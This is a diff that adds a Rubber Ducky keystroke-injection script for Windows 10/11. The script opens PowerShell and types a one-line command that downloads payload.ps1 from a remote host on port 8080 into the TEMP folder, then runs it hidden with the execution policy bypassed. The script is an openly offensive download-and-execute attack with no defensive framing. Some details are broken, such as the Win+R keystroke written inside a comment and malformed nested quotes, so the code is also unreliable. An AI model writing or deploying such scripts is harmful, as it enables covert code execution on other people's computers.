@@ -1,0 +1,33 @@
+REM Rubber Ducky Windows Script   
+
+REM Targets: Windows 10/11  
+
+DELAY 1000  
+
+REM Step 1: Open Run dialog (Win+R) GUI r  
+
+DELAY 750 
+
+REM Launch PowerShell from Run dialog  
+
+STRING powershell  
+
+DELAY 300 ENTER 
+
+REM Wait for PowerShell to fully initialize  
+
+DELAY 2000 
+
+REM  Download and execute the payload  
+
+STRING try { $tempPath = "$env:TEMP\payload.ps1"; Invoke-WebRequest 'http://192.168.xx.xxx:8080/payload_windows.ps1' -OutFile $tempPath -ErrorAction Stop; Write-Host "Download successful!" -ForegroundColor Green; Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File "$tempPath"" } catch { Write-Host "Error: $_" -ForegroundColor Red }  
+
+DELAY 500  
+
+ENTER 
+
+REM Give time for feedback  
+
+DELAY 4000 
+
+ 
